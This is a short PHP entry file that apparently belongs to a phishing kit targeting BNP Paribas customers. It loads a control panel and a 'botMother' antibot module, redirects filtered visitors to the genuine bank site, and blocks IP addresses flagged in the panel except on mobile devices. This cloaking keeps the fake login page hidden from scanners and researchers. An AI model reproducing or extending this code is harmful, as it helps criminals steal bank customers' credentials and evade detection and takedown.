<?php


require (__DIR__).'/config.php';
require (__DIR__).'/panel/panel.class.php';
require (__DIR__).'/lib/frm.php';
$pnl = new Panel();
$current_data = $pnl->getData();
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$m = new botMother();
$bm->setExitLink("https://mabanque.bnpparibas/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
    $bm->run();
}

    $__ippp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
    $__ippp = "127.0.0.1";
}else{
    $__ippp = $_SERVER['REMOTE_ADDR'];
}

$detect = new Mobile_Detect;
if(!$detect->isMobile() and strtolower($pnl->getBlock($__ippp)) == "yes"){
    if(file_exists('app.php')){
        exit(header("location: block.php"));
    }else{
        exit(header("location: auth/block.php"));
    }

}
















?>